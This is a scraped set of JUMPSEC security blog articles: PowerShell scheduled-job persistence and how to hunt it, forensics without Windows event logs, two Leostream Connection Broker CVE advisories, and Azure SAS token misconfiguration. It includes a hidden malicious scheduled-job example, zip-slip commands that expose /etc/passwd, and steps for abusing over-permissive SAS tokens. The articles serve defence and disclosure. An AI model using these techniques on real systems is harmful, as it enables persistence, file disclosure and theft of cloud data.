Beyond: Exploring non-HTTP protocols using MITM_RELAY"},"/articles/2021/10/2021-10-07-powershell-jobs/":{"data":{"according-to-schedule#According to schedule":"PowerShell jobs can also be scheduled to execute on very particular conditions\n#organise when the task should trigger $trigger = New-JobTrigger -Daily -At \"4:15 AM\" -DaysInterval 3; #register the PowerShell job Register-ScheduledJob –Name Collect_date –ScriptBlock {date} –Trigger $trigger There are numerous ways to go and find where our scheduled job is located\n#Either of these work just fine Get-ScheduledJob -id x Get-ScheduledTask -taskname x We can also find out a scheduled job’s date, time, and frequency are due to be executed\nGet-JobTrigger -name x ","hunting#Hunting":"In our JUMPSEC clients’ environments, we have found no system-level usage of scheduled jobs. This suggests that scheduled jobs you identify are deliberately put there and are worth investigation.\nYou can query the scheduled jobs on a machine with this straight forward command\nGet-ScheduledJob You can also examine when this scheduled job is due to be executed\nGet-ScheduledJob | Get-JobTrigger | Ft -Property @{Label=\"ScheduledJob\";Expression={$_.JobDefinition.Name}},ID,Enabled, At, frequency, DaysOfWeek Knowing that this premeditated attack will ruin Christmas for an incident responder, let’s neutralise the malicious PowerShell job that has been scheduled. ","hunting-malicious-jobs#Hunting Malicious Jobs":"Now, you know me, I’m not about to show you something malicious without showing you the defensive counterpart! Let’s put our Blue Team hat on","malicious-scheduled-jobs#Malicious scheduled jobs":"In the above example, we’re completing the rather boring scheduled job of collecting the date. A more interesting representative example of how PowerShell jobs can be leveraged by attackers was found during our response to a recent incident. Whilst this article won’t recreate the exact syntax the attacker used for obvious reasons, we’ve provided a functionally similar example below.","monitoring#Monitoring":"From a monitoring and detection point of view, if we combine Sysmon and Florian Roth’s config of rules, we can see how a PowerShell job would be flagged\nThe BLUE arrows: event info The Event ID 11 involves file creation The RED arrows: specific info TargetFileName shows that the scheduled job has been written to the Task directory Notice, however, we have no visibility to WHAT this task does….we just know it has been registered. The PINK arrow: MITRE ATT\u0026CK reference This may not be in every sysmon config. However Florian Roth includes the MITRE ATT\u0026CK tactic number in a particular event. This allows security analysts to schematise the event data they are observing with the wider TTPs of an adversary. In the above sysmon/endpoint log based SIEM, we would have some visibility of scheduled jobs. However this data won’t be enough for an analyst to work with. We need to dig deeper beyond passive monitoring to active threat hunting to identify exactly what this scheduled job is about. ","responding#Responding":"You can remove a PowerShell scheduled job in two different ways, neither of which present a disadvantage. #option one Unregister-ScheduledTask -TaskName Christmas_Day -verbose -Confirm:$false #option two Unregister-ScheduledJob Christmas_Day -verbose -Confirm:$false We can confirm that the malicious tasks have been eradicated from this machine.","scheduling-security#Scheduling Security":"This article took inspiration from a real life attack, and examined how an adversary could abuse PowerShell scheduled Jobs to both gain persistence, and quietly dwell on a network before picking the opportune moment to strike. Scripted attacks must be proactively identified and eliminated, as automated attack chains can be speedily operated by an attacker, reducing the opportunity for defenders to respond. It’s important you are scouring your network for the recurring tasks that can give an attack a backdoor into your environment. Related articles: We recently wrote about how registry run keys can offer adversaries a stealthy persistence mechanism\nDetect and investigate any recurring tasks you see in your environment, and you may just catch an adversarial campaign before they can cause any damage. Deny them the pleasure of striking on Christmas Day!\nAny questions, comments, or criticisms please drop me a line\nTwitter Github\nDray Agha, Security Researcher","using-for-evil#Using for evil":"Let’s schedule a malicious PowerShell Job to run at 3 o’clock in the morning on Christmas Day - a gift to incident responders and sysadmins everywhere!\n#schedule the job for Christmas $trigger = New-JobTrigger -Once -At \"12/25/2021 3:00 AM\"; #point to the malicious script to execute $file = C:\\SuperEvil.ps1 #try to hide this job from the Task Scheduler GUI….will still show up in the command line and GUI (if the right options are selected in ‘View’) $options = New-ScheduledJobOption –HideInTaskScheduler; #and now schedule the job Register-ScheduledJob –Name Christmas_Day -FilePath $file –Trigger $trigger –ScheduledJobOption $options Now, we’ve emulated how an adversary could weaponise a PowerShell job to strike when the defenders are less likely to be able to manually react and respond. In these cases, automated measures to prevent and detect the threat are essential.","using-legitimately#Using legitimately":"When using the command line for most operating systems, users have to run a command and wait a microsecond for the system to return with a reply. This can be inconvenient - for example, when running a script that will take a while to run, or when you know that you want to run the command at a specific time or date in the future. When using PowerShell, a job allows you to push a task into the background. PowerShell will continue to work on your query behind the scenes and allow you to continue using the shell for other things. #Push command to the background Start-Job -ScriptBlock {date} #Retrieve the results of the backgrounded command Receive-job -name X ","what-are-powershell-jobs#What are PowerShell Jobs":"By Dray Agha\nJUMPSEC investigators recently observed an adversary weaponising PowerShell Jobs to schedule their attack, whilst responding to an incident. In this article, we discuss what PowerShell jobs are, how they can be leveraged for malicious purposes, and how defenders can protect, detect, and respond to neutralise the threat. What are PowerShell JobsAdversaries are known to schedule parts of their campaign once they have infiltrated a target network. They may timetable their attack for an opportune moment (such as during unsociable hours, based on the region in which the infrastructure is hosted, or support teams reside) or set up a recurring task to ensure ongoing persistence. PowerShell jobs aren’t designed to be inherently malicious and have many legitimate use cases. However, as is often the case in cyber security, the innate functionality of PowerShell Jobs and its susceptibility to abuse means it can also be leveraged by an adversary. "},"title":"PowerShell Jobs"},"/articles/2021/11/2021-11-22-no-logs-no-problem-incident-response-without-windows-event-logs/":{"data":{"#":"By Dray Agha\nIn this article, we discuss some Digital Forensics and Incident Response (DFIR) techniques you can leverage when you encounter an environment without Windows event logs.\nWhere are the logs?At JUMPSEC, we regularly respond to security incidents with ineffective logging and auditing for the purposes of a cyber incident. In some cases, organisations we encounter don’t have any recognisable SIEM or centralised log repository. In others, organisations with otherwise sufficient logging have seen adversaries intentionally manipulate the logs on an endpoint to prevent analysis - sometimes even wiping them entirely. Clearing the event logs on a Windows machine is trivial. It is a recognised behaviour of adversaries [T1070.001] who wish to evade and frustrate investigators’ efforts to unravel the TTPs of a malicious campaign. Without the event logs on a machine, you cannot use beautiful tools like Chainsaw to easily piece together the story for your client. Thankfully, our guidance is relevant to all situations where logs are unavailable to support an investigation. Log-less investigationsFor the rest of this article, I would like us to operate under a log-free paradigm - where the event logs cannot be utilised in an investigation. I’d like us to discuss three DFIR techniques that you can easily deploy when next conducting analysis on a machine that an adversary has tampered with. The machine may or may not have the required logs, or you may not trust the evidence - meaning we must verify past events through other means. As we do not have the permanency that event logs offer, we are left with volatile forensic data. Simply put, if you do not get to most forensic data as quickly as possible then it may be gone forever. If the machine is rebooted, the data can be lost; if the machine is left on and is used, many pieces of forensic evidence may be overwritten and lost forever.\nTaking a forensic image is out of scope for this article, however it may be advisable to do it as quickly as possible to ensure you can access the volatile, capricious data consistently throughout an investigation. There are many techniques for digital forensics. To understand and deploy the more advanced tools, there are many wise sages who I would recommend, such as Richard Davis’ 13Cubed. In particular, there are three (or four, if you’re feeling brave) post-log techniques I consider to have a low barrier to entry in terms of technical capability, have general resiliency to adversarial manipulation, and are relevant to Windows endpoints and servers:\nPSReadLine (PowerShell History) Prefetch (PEcmd) Shimcache (AppCompatcache) BONUS: USN Journal (via Velociraptor) PSReadLineThis first one is a technique I do not see discussed that much. And I’m not sure why. It has definitely illuminated parts of an attack that were once a mystery to me in the early stages of an investigation. The only detailed post I can find is a blog by Sophos, but I find it lacks some of the operational guidance that an investigator needs. PsReadLine is a PowerShell module that can do lots of cool things. Most pertinent for our conversation is its ability to offer insight into the history of the PowerShell commands previously run.\nIf we run some commands, we can instantly recall them via history (this isn’t the DFIR part, I promise).\nHowever, if the machine is rebooted (`Restart-Computer`), or the history cleared (`Clear-History`) then that history is lost. Moreover, running the history command will only return the history of the current user and session - so other users who sign into the machine and run commands will remain a mystery… Or maybe not?\nPSReadLine: Retrieve PowerShell History PSReadLine will save the last four thousand commands a user has run into a particular file. If you query each users’ ConsoleHost_history.txt, you can retrieve these commands. get-content C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt Here, we can see the commands I ran above. These were previously lost to us when the machine was rebooted and/or the history wiped… but here they are available for us to piece together what the adversary did!\nI wouldn’t want you to have to manually do this for every user’s history - that would waste your precious time! On an endpoint, we can run a quick loop that will print every user ConsoleHost_history file:\n$Users = (Gci C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt).FullName; $Pasts = @($Users); foreach ($Past in $Pasts) { write-host \"`n----User Pwsh History Path $Past---\" -ForegroundColor Magenta; get-content $Past } From our short script, in the pink text we’ve printed the users’ Console History file. This will snitch on last four thousand commands from each user account. We can also see that in the red arrow and box Frank’s account is highlighted for deploying Mimikatz! Below Frank’s commands, we can see the IEUser’s PowerShell history begins to also be printed. This was the first technique to trace the steps of the adversary. But keep in mind some caveats: First, an attacker may just delete this file as part of their clean up operation; Second, it will only record PowerShell - not cmd or wmic; Third, it will only record up to 4096 PowerShell commands; and finally, the console host history text file will not be available on all Windows OS’ and builds. PrefetchIf you go to the directory C:\\Windows\\Prefetch on a Windows endpoint, you’re in for a treat. Prefetch (also known as prefetcher) is a caching technique whereby an application is monitored and catalogued for the first few seconds it is launched, to make re-launching more efficient. If this sounds like something awesome for a log-less investigation, then you’re right!\nIf you sort by the prefetch files recently written to, you can see the executables recently deployed by both the user and the computer itself.\ndir 'C:\\Windows\\Prefetch' | sort LastWriteTime -desc If we look very closely at the prefetch files (.PF), we can see that Mimikatz makes a special guest appearance!! This evidences that Mimikatz has been executed, but we don’t get any more context from the name of the prefetch file.\nPrefetch: PECmd The contents of a prefetch file cannot be simply read to gather more execution context! This is where Eric Zimmerman’s PEcmd comes to save the day. This tool will carve through the prefetch directory or a prefetch file, and make it easier for investigators to see the discrete info about the prefetched data. # I’d advise picking the -f flag, and picking on one of the prefetch files you see in the directory .\\PECmd .exe -f 'C:\\Windows\\prefetch\\MIMIKATZ.EXE-599C44B5.pf' #get granular timestamps by adding -mp flag .\\PECmd .exe -f 'C:\\Windows\\prefetch\\MIMIKATZ.EXE-599C44B5.pf' -mp # If you don’t know what file you want to process, get the whole directory. Will be noisy though and I wouldn’t recommend .\\PECmd .exe -d 'C:\\Windows\\Prefetch' --csv . #dot at the end means write in current directory You get a whole load more with PECmd. Let’s look in more detail at what you’re given. First, we can see the various times associated with this executable (creation, modification etc). We’re also told about the executable name and file size. Interestingly, on the last line we can see the amount of times the executable has been run (once, on our instance) as well as the time it was last run.\nNext, we are given insight into the directories and then the files that were involved in this execution - this is again another excellent way to better map the granular behaviour the adversary had during their attack. Note that Eric Zimmerman is kind enough to highlight the offending executable. PEcmd can do even more if you want to check out some other blog posts and docs. There are some caveats for this second technique:\nFirst, prefetch exists from Windows XP onwards, but PEcmd will only work from Windows 8 above; Second, you don’t retrieve the arguments or parameters used and so can only know the base executable that the adversary leveraged; Third, the relevancy of prefetch is time-based - so if you do not collect it after an incident and the machine continues to be used then you may lose the evidence; Fourth and most important, prefetch has to be enabled on servers, as Microsoft disables recording prefetch on Windows servers by default. It is enabled on normal Windows endpoints. You can enable prefetch recording with the following on a Windows Server: reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Memory Management\\PrefetchParameters\" /v EnablePrefetcher /t REG_DWORD /d 3 /f; reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Prefetcher\" /v MaxPrefetchFiles /t REG_DWORD /d 8192 /f; Enable-MMAgent –OperationAPI; net start sysmain ShimcacheShimcache analysis is our third technique to gather insight into an attacker’s past activities. Shimcache - called AppCompatCache on a Windows machine - was originally made to determine interoperability issues between Windows versions and applications. Like prefetch, we can leverage shimcache to identify evidence of execution on a machine when we do not have event logs. Another Eric Zimmerman tool called AppCompatCacheParser can give us insight into what was run on the system. .\\AppCompatCacheParser.exe -t --csv . --csvf shimcache.csv This will create a CSV, which you could import to your spreadsheet of choice… but some quick PowerShell can give you some visibility. There will be a lot of noise here, but if we filter through we can find something quite interesting.\nimport-csv .\\shimcache.csv | sort lastmodified -Descending | fl path,last* Despite not having access to the event logs, if we query shimcache we can see proof of Mimikatz’ execution, once again. Shimcache is a relatively straightforward artefact to query. It does however have some complications, as its implementation varies in Windows versions over the years. And again, if an investigator is not quick enough to gather the shimcache data then it may be lost!\nBONUS: USN JournalThe USN journal isn’t as easy an artefact to investigate as it is extremely verbose. I’ve included it as a bonus fourth tip, in case the above three techniques fail to deliver you any insight for your log-less investigation. The USN journal leverages some of the artefacts we have previously encountered (like prefetch). It also can reach much further back into the past, compared to other volatile artefacts, and identify files that were long deleted - excellent for DFIR purposes [1, 2].\nDr Michael Cohen’s Velociraptor is an excellent tool to help us leverage the USN journal to see what an adversary did. Fortunately, there is a dedicated blog that offers step-by-step advice on how best to leverage Velociraptor to hunt USN details.\nI’d recommend Velociraptor for its low technical barrier to deploy many other advanced forensic techniques, including prefetch hunts.\nUSN Journal: Velociraptor We can download Velociraptor on a machine we are investigating and launch it straight there - no need to set up any server-client infrastructure, when in an emergency: velociraptor.exe gui #spin this up as admin The web browser will pop up, and we will be met with Velociraptor’s GUI. We can traverse to the main hunting page and name our hunt. We can then pick the USN forensic hunt, and fire it off.\nWhilst the results are being collected and parsed, we can write some VQL (Velociraptor Query Language) to sort the results by timestamp, and filter out some other headers we don’t care about: SELECT Usn,Timestamp,Filename,Fullpath,FileAttributes,Reason,SourceInfo FROM source() ORDER BY Timestamp desc In our USN journal results, we can see the relics of a Mimikatz execution, along with the timestamp that we can use to map the adversaries timeline. Unfortunately, the USN journal is often challenging to navigate when used in a real life incident. My arbitrary example with Mimikatz doesn’t quite convey the complexity and verbosity that you will face when leveraging the USN journal in a real investigation. For example, in our artificial scenario, just a few runs of Mimikatz resulted in near 97 rows in the USN journal, via Velociraptor.","bonus-usn-journal#BONUS: USN Journal":"","burn-the-logs-see-if-i-care#Burn the logs, see if I care!":"This has been an overview into a number of easy to use, highly-reliable, rapid digital forensics techniques. I have found these techniques useful in investigations where the event logs can no longer be trusted or accessed due to adversarial tampering, or perhaps where logging was not set up in the first place by the client. We have barely scratched the surface of digital forensics and incident response. There are still a whole load of techniques you can deploy when you find that Windows event logs cannot deliver you the puzzle pieces you need:\nIf you want to read about amcache, I can recommend this excellent paper Checkout the rest of Eric Zimmerman’s awesome tools! If you need to explore a forensic image or memory dump, I can recommend some cheat sheets (shameless plug) on leveraging tools like Volatility For more information on DFIR techniques, Richard Davis 13Cubed videos are essential educational resources When you’re next tasked with a log-less investigation, see if you can leverage PowerShell history, prefetch, shimcache, and the USN journal to identify any undiscovered nuance to your adversaries’ campaign. Any questions, comments, or criticisms please drop me a line\nTwitter Github\nDray Agha, Security Researcher","log-less-investigations#Log-less investigations":"","prefetch#Prefetch":"","psreadline#PSReadLine":"","shimcache#Shimcache":"","where-are-the-logs#Where are the logs?":""},"title":"No Logs? No Problem! Incident Response without Windows Event Logs"},"/articles/2022/01/2022-01-26-advisory-cve-2021-41550-leostream-connection-broker-authenticated-remote-code-execution/":{"data":{"":"Software: Leostream Connection Broker\nAffected Versions: 9.0.40.17\nVendor page: https://leostream.com/\nCVE Reference: CVE-2021-41550\nPublished: 25/01/2022\nAttack Vector: Remote, authenticated\nCredits: Andrei Constantin Scutariu, Lenk Ratchakrit Seriamnuai, Andrea Malusardi\nSummary\nAs the Leostream Connection Broker version: 9.0.40.17 allowed an attacker to upload any content through Third Party Content functionality, it was found that the application allowed the listed filenames below the ability to execute Perl programming language by default on the web application.\nMitigation\nThe Leostream has released a patch for this vulnerability, JUMPSEC recommend upgrading the affected versions as soon as possible. Leostream’s release notes and advisories can be found here.\nTechnical details\nFor achieving remote code execution, an attacker with administrator access to the application - or access as a custom role allowing TPC uploads - can upload Perl files to be executed server-side. The default web server configuration in use by the web application (which is accessible by downloading the archive at “Download Technical Support Package” link on the left menu bar from Leostream’s website) contained the httpd.conf, which shows that the following filenames can be executed:\nall_back.pl clients.pl config.pl database_error.pl error_document.pl fastlist.pl index.pl invite.pl license.pl logout.pl pcoip_broker.pl plan.pl rest.pl rpc.pl sam.pl saml.pl search.pl server.pl status.pl support.pl syslog_server.pl user.pl view.pl webquery.pl Welcome.pl The malicious file will be made available under the /tpc/ directory on the web server. The attacker can then trigger the malicious code execution by visiting the uploaded files.\nTimeline\n10/09/2021: Issue reported to the vendor\n10/09/2021: Vendor acknowledged the issues\n22/09/2021: CVE number assigned from MITRE\n16/10/2021: The security patch was released by Leostream\n25/01/2021: Advisory published by JUMPSEC"},"title":"Advisory CVE-2021-41550 Leostream Connection Broker - Authenticated Remote Code Execution"},"/articles/2022/01/2022-01-26-advisory-cve-2021-41551-leostream-connection-broker-authenticated-zip-slip/":{"data":{"":"Software: Leostream Connection Broker\nAffected Versions: 9.0.40.17\nVendor page: https://leostream.com/\nCVE Reference: CVE-2021-41551\nPublished: 25/01/2022\nAttack Vector: path traversal, authenticated\nCredits: Andrei Constantin Scutariu, Lenk Ratchakrit Seriamnuai, Andrea Malusardi\nSummary\nLeostream Connection Broker 9.0.40.17 allows administrators to conduct directory traversal attacks by uploading a ZIP file that contains a symbolic link.\nMitigation\nThe Leostream has released a patch for this vulnerability, JUMPSEC recommend upgrading the affected versions to this new version as soon as possible. Leostream’s advice and release notes can be found here.\nTechnical details\nFor achieving local file inclusion, an attacker with administrator access to the application - or access as a custom role allowing TPC uploads - can upload zip files to be extracted in the web server directory. The attackers uploaded zip file should be created with a symbolic link by executing “ln -s /etc/passwd passwd”, which can then be zipped using “zip –symlink -r upload.zip passwd” to create the archive. After supplying the zip file to the application, the archive will be extracted and the target file (in this case /etc/passwd) will be accessible in the /tpc/ directory of the web server, in this example /tpc/passwd.\nTimeline\n10/09/2021: Issue reported to the vendor\n10/09/2021: Vendor acknowledged the issues\n22/09/2021: CVE number assigned from MITRE\n16/10/2021: The security patch was released by Leostream\n25/01/2021: Advisory published by JUMPSEC"},"title":"Advisory CVE-2021-41551 Leostream Connection Broker - Authenticated Zip Slip"},"/articles/2022/07/2022-07-14-azure-securing-shared-access-signatures-sas/":{"data":{"":"","#":"Tom Ellson - Head of Offensive Security\nSummary / TLDR; During a recent client security assessment I came across a number of insecure Azure Storage Accounts. On delivery of the recommendations, it struck me that the client was somewhat unaware of the risks associated with their Azure Storage Accounts. Despite that, the client had a multi-cloud policy and had correctly deployed Amazon S3 buckets elsewhere in their network.\nThis blog post is designed to raise awareness of the risks posed by insecure Azure Storage Accounts, analysing the features most interesting to an attacker in terms of exploitable functionality that may be introduced by misconfiguration. It is not intended to be exhaustive and should be used as an accompaniment to existing guidance released by Microsoft. Background Insecure storage accounts have dominated the headlines for all the wrong reasons over the last couple of years, particularly when related to cloud services. Misconfiguration of Amazon S3 storage buckets, for example, has been identified as one of the most commonly exploited security issues for users of cloud services.\nAs a result, last year Amazon updated the default configurations of S3 buckets to be private and accessed only by users explicitly granted access, in addition to producing revised best practice guidance on how to secure them effectively. However, this only applies to newly deployed services, meaning previously deployed instances continue to be vulnerable where they had been deployed with insecure configurations. Azure Storage Accounts are the Microsoft equivalent of Amazon S3 buckets, and are susceptible to many of the same challenges. Namely, that (as with other cloud services) they are often deployed by teams without the security know-how to configure them effectively, and that default deployments will often lack the necessary level of controls for their environment unless they are explicitly enabled by the IT team. Client Environment Overview The application was deployed successfully in Azure and was making use of Azure file storage accounts containers and blob storage. There was a javascript file being loaded - lets call it main.js. Main.js contained several interesting looking core.windows.net domain names.\nFurther to this, the js file also contained the SAS tokens required to access the resource. The SAS tokens were being used to access resources in the front end, rather than hard coding the access token in the backend and creating a front end function to access the resource through an endpoint or parameter. The SAS tokens were set with an excessive lifetime and granted full permissions on the containers, blobs and file shares. Here’s an example:\nhttps://jstest20.blob.core.windows.net/fd81344e-e9c1-4bfa-b64f-9e6380aea347**?comp=list**\u0026sv=2019-12-12\u0026ss=bfqt\u0026srt=sco\u0026sp=rwdlacupx\u0026se=2020-07-31T03:41:59Z\u0026st=2020-07-30T19:41:59Z\u0026spr=https\u0026sig=REDACTED\nThis immediately jumped out as a risk, because from here we were able to traverse the blob containers and file share containers to gain access to sensitive information without even having to authenticate to the application, as the .js file was loaded as the page was rendered.\nAttack Path Analysis The following graphic demonstrates the attack path in which a threat actor would move from compromising the web organisation whilst only making a single request to the web application.\nAttack Surface As an attacker, the most interesting and exploitable functions I would look for would be regarding the information that can be used to further gain access to an environment or corporate data. In the example graphic, the attacker gained access to the corporate on premise environment whilst only making a single request to the main.js file on the web server.\nThe lack of segregation plays a part in the compromise of enterprise resources. The file share that is used as a development storage account, is also used to store corporate documentation and configuration files that can be used to facilitate an on-premise connection.\nTraditional methods of container compromise include being able to access the resources without authentication, or an AWS or Azure administrator unintentionally allowing public access to cloud storage. This is made difficult due to the amount of warnings that are in place to help educate the user on what they are about to expose themselves to. Azure Storage Accounts compromise could enable an attacker to host a malicious website, pose as a legitimate business or initiate a watering hole attack - thereby poisoning legitimate users’ traffic.\nExamples of real work applications of misconfigured storage accounts include the usage of Azure File Storage accounts being used to host content for job postings - e.g. where an administrator who has provisioned access has used a SAS token within the front end rather than using an account token in the backend and wrapping a client side function around it.\nStorage Account Overview First, let’s take a look at storage accounts and the function they perform. In essence, users (either solo or part of an Azure AD tenant) can create storage accounts within Azure resources; these storage accounts can be used as object storage within the cloud. The Azure storage account contains all Azure storage that being blobs, containers, queues, tables, and disks. When spinning up a storage account the name of the storage account has to remain unique as it will be a namespace for your Azure storage data. In some cases, this data is accessible over the public internet (more on that later). The schema takes the following approach when deploying storage:\nhttps://jstest20.blob.core.windows.net/ https://jstest20.file.core.windows.net/ https://jstest20.queue.core.windows.net/ https://jstest20.table.core.windows.net/ https://jstest20.dfs.core.windows.net/ https://jstest20.z13.web.core.windows.net/ File shares can also be set up in the Azure storage accounts to access resources over SMBv3 (port 445), and using an account key to authenticate and mount the share locally. Shared Access Tokens (SAS) Microsoft defines three types of SAS: Service SAS, Account-level SAS, and User Delegation SAS. The account-level SAS can provide access to various services present within the storage account, e.g blob, file, etc. providing access to the resource, service level API’s, container API’s, object API’s, etc. and gives pretty much free reign on reading, writing and deleting storage account contents. In contrast, the service SAS gives access to just one service within a storage account.\nAccount-Level vs Service-Level The main difference between the three from an attacker perspective is ease of control of the Storage Account. Account-level SAS tokens will grant access to all resources (depending on the SignedResourceTypes (more on this below). Account-level tokens can be used to grant access to all containers, blobs, file shares, queues and tables within the storage account. The graphic above demonstrates the difference between Account-level and Service-level SAS tokens. The example shows that an account-level SAS token can be used to access blobs and containers, however if the SignedServices is over permissive, such as ss=bfqt this will allow the SAS token to be used for all Storage Account services. The SignedResourceTypes is set to sco - allowing the SAS token to be used for service-level, container-level, and object-level API’s.\nAccount-level SAS An Account-level SAS was introduced with version 2015-04-05. It delegates access to resources in one or more of the Azure Storage Account services. All of the operations available via a service SAS are also available via an Account-level SAS.\nWe aren’t going to reinvent the wheel here by explaining all concepts of how SAS tokens work and how they are constructed. In essence, the Account-level SAS can be used to access blobs, containers and other storage account features. The SAS token is made up of the SAS URI, which contains the Storage URI and SAS Token.\nStorage Resource: https://jstest20.blob.core.windows.net/fd81344e-e9c1-4bfa-b64f-9e6380aea347/test.txt\nAccount-level SAS Token: ?sv=2019-12-12\u0026ss=bfqt\u0026srt=sco\u0026sp=rwdlacupx\u0026se=2020-07-31T00:09:01Z\u0026st=2020-07-30T16:09:01Z\u0026spr=https\u0026sig=REDACTED\nAccount-level SAS URI: https://jstest20.blob.core.windows.net/fd81344e-e9c1-4bfa-b64f-9e6380aea347/test.txt?sv=2019-12-12\u0026ss=bfqt\u0026srt=sco\u0026sp=rwdlacupx\u0026se=2020-07-31T00:09:01Z\u0026st=2020-07-30T16:09:01Z\u0026spr=https\u0026sig=REDACTED\nThere are several parameters that make up Account-level SAS tokens, but for the purpose of this post, 5 will be discussed.\nSignature (sig) Sig=XXXX SignedExpiry (se): se=2020-07-31 SignedPermission (sp) sp=rwdlacupx SignedServices(ss) ss=bfqt SignedResourceTypes (srt) sr=sco Signature Arguably, the most important on this list is the Signature. The signature is used to authorise the request to the endpoint or resource. MFST says “The string-to-sign is a unique string constructed from the fields that must be verified in order to authorize the request. The signature is an HMAC computed over the string-to-sign and key using the SHA256 algorithm, and then encoded using Base64 encoding.” SignedExpiry The SignedExpiry parameter is also important. An extended lifetime means increases the risk of abuse if the SAS token is compromised, as long as it has not been revoked, or the container / resource deleted. It is vital that the expiry time is fit for purpose and valid for the period required. SignedPermission SignedPermission defines what permissions are allocated to the SAS token. rwdlacupx is the most permissive, and allows for read (r), write (w), delete (d), list (l), add (a), create (c) , update (u), and process (p). When interacting with blobs and file storage, the following permissions are not required in order to gain full control over the containers and file shares.\nAdd (a) Update (u) Process (p) More on this can be found here:\nhttps://docs.microsoft.com/en-us/rest/api/storageservices/create-account-sas\nJust like expiry, it is vital that these permissions are accurate for the client / user trying to access the resource; incorrect configuration of these could lead to data loss and/or compromise.\nSignedResourcetypes SignedResourceTypes is another big one. It determines the type of SAS token you possess. For example sr=sco will give you access to the stated service, object and container APIs. A must for providing external users access to the storage account.\nSignedServices Finally SignedServices, in essence, which services the SAS token has access to; blob, queue, file, or table. As you can imagine, these are often heavily over-permissive, with administrators giving out SAS tokens that bear the following privileges: (access to everything).\n?sv=2019-12-12\u0026ss=bfqt\u0026srt=sco\u0026sp=rwdlacupx\u0026se=2021-07-31T00:31:36Z\u0026st=2020-07-30T16:31:36Z\u0026spr=https\nService-Level SAS A service-level SAS delegates access to resources in just one of the storage services. The services range from blob, Queue, Table or File. Service-level SAS can be granular to blobs, containers and directories\nThe service-level SAS can be generated within the Azure portal, but the configuration is limited. Recently Azure released the ability to provide granular permissions or containers in which the depth could be specified, to provide restriction around traversing containers and sub directories.\nThe below C# snippet can generate service level SAS tokens and provide granular access to resources, in the below example, the token is granted for read, write and list permissions to the container testfile01 inside the storage account jsteststorage111. This service level SAS is granted on a container level, meaning that any attempts to access any other resources will not work.\nhttps://gist.github.com/tdesec/ccb41e4606c1ea83a264bf14d439ed76\npublic void GetAdHocContainerSasToken(){ var containerName = \"testfile01\"; var connectionString = \"DefaultEndpointsProtocol=https;AccountName=jsteststorage111;AccountKey=XXXXXXXXXXXXXXXXXXXXXXX==;EndpointSuffix=core.windows.net\"; var sasBuilder = new ShareSasBuilder() { ShareName = containerName, Resource = \"s\", //Value b is for generating token for a Blob and c is for container StartsOn = DateTime.UtcNow.AddMinutes(-2), ExpiresOn = DateTime.UtcNow.AddMinutes(10), }; sasBuilder.SetPermissions(ShareSasPermissions.Read | ShareSasPermissions.Write| ShareSasPermissions.List); //multiple permissions can be added by using | symbol var sasToken = sasBuilder.ToSasQueryParameters(new StorageSharedKeyCredential(GetKeyValueFromConnectionString(\"AccountName\"), GetKeyValueFromConnectionString(\"AccountKey\"))); Console.WriteLine($\"{new ShareClient(connectionString, containerName).Uri}?{sasToken}\u0026restype=directory\u0026comp=list\"); User-delegated SAS A “user delegation” SAS allows for signing of the SAS token using an AzureAD account. This method allows for SAS creation without the need for account key usage.\nIt is always recommended to use a User Delegation SAS when possible. A user delegation SAS provides additional security benefits compared to a service or an account SAS. User-delegated SAS tokens are only valid for a maximum of 7 days, any attempt to set the expiration date later than 7 days will result in failure. This makes them particularly tricky to compromise and is a metric that increases the overall security of the token.\nBelow is an example of creation of a user delegated SAS token, the user has already authenticated to AzureAD user the az command.\naz storage account list \"primaryEndpoints\": { \"blob\": \"https://jsteststorage111.blob.core.windows.net/\", \"dfs\": \"https://jsteststorage111.dfs.core.windows.net/\", \"file\": \"https://jsteststorage111.file.core.windows.net/\", \"internetEndpoints\": null, \"microsoftEndpoints\": null, \"queue\": \"https://jsteststorage111.queue.core.windows.net/\", \"table\": \"https://jsteststorage111.table.core.windows.net/\", \"web\": \"https://jsteststorage111.z33.web.core.windows.net/\" }, az storage container generate-sas --account-name jsteststorage111 --name test --permissions acdlrw --auth-mode login --as-user --expiry 2021-09-11 \"se=2021-09-11\u0026sp=racwdl\u0026sv=2018-11-09\u0026sr=c\u0026skoid=e156ac44-6e88-4d07-9777-3716bd6dc45a\u0026sktid=0339c78f-95d6-477b-a564-dd9e6f897c1b\u0026skt=2021-09-10T17%3A54%3A34Z\u0026ske=2021-09-11T00%3A00%3A00Z\u0026sks=b\u0026skv=2018-11-09\u0026sig=vym9zUUuYUmSzp1%2BNoBGzC5YeXGBGVxtYxC7HAZgfTc%3D\" Privately Accessible Storage Accounts Now to look at the public access denied storage accounts. Visiting the endpoint gives quite a generic error that defines that public access is not permitted. This can be used to enumerate public vs private storage accounts. If the SAS token is compromised, the storage account is still accessible.\nGET https://jsteststorage111.blob.core.windows.net/\n\u003cError\u003e \u003cCode\u003ePublicAccessNotPermitted\u003c/Code\u003e \u003cMessage\u003ePublic access is not permitted on this storage account. RequestId:54d84fc4-601e-0051-57a8-66d68b000000 Time:2020-07-30T19:34:11.0871138Z\u003c/Message\u003e \u003c/Error\u003e Using a compromised SAS token, again we have access to list the container; unlike the unauthenticated calls, with SAS tokens you can list container names. Below we generated an Account-Level SAS token to list the containers.\nGET https://jsteststorage111.blob.core.windows.nett/?comp=list\u0026restype=container\u0026sv=2019-12-12\u0026ss=bfqt\u0026srt=sco\u0026sp=rwdlacupx\u0026se=2020-07-31T03:41:59Z\u0026st=2020-07-30T19:41:59Z\u0026spr=https\u0026sig=XXXXX\n\u003cEnumerationResults ServiceEndpoint=\"https://jsteststorage111.blob.core.windows.net/\"\u003e \u003cContainers\u003e \u003cContainer\u003e \u003cName\u003efd81344e-e9c1-4bfa-b64f-9e6380aea347\u003c/Name\u003e \u003cProperties\u003e \u003cLast-Modified\u003eThu, 30 Jul 2020 15:16:12 GMT\u003c/Last-Modified\u003e \u003cEtag\u003e\"0x8D8349B7EC39B39\"\u003c/Etag\u003e \u003cLeaseStatus\u003eunlocked\u003c/LeaseStatus\u003e \u003cLeaseState\u003eavailable\u003c/LeaseState\u003e \u003cPublicAccess\u003eblob\u003c/PublicAccess\u003e 